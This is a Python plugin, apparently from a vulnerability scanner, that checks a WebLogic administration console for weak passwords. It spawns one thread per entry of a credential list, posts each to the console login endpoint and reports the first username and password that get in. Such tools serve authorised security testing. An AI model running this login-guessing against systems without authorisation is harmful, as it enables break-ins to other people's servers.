# -*- coding:utf-8 -*-
# weblogic控制台弱密码

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan
import threading

class Burp(threading.Thread):
    def __init__(self, url, username, pwd):
        threading.Thread.__init__(self)
        self.url = url
        self.username = username
        self.pwd = pwd
        self.result = False

    def run(self):
        resp = requestUtil.post(self.url+"/console/j_security_check", data={
            "j_username": self.username,
            "j_password": self.pwd
        })
        if "管理控制台主页" in resp.text:
            self.result = True

    def get_result(self):
        return self.result




def fingerprint(service):
    if service.url:
        resp = requestUtil.get(service.url+"/console")
        if resp.status_code == 200:
            return True

def poc(service: ServiceScan):
    try:
        burp_info_list = fileUtil.get_burp_list("weblogic")
    except:
        return []
    burp_list = []
    for i in burp_info_list:
        burp_list.append(Burp(service.url, *(i)))
    for i in burp_list:
        i.start()
    for i in burp_list:
        i.join()
    for i in burp_list:
        if i.get_result():
            return ["weblogic控制台弱密码", "用户名: %s<br>密码: %s"%(i.username, i.pwd)]
    return []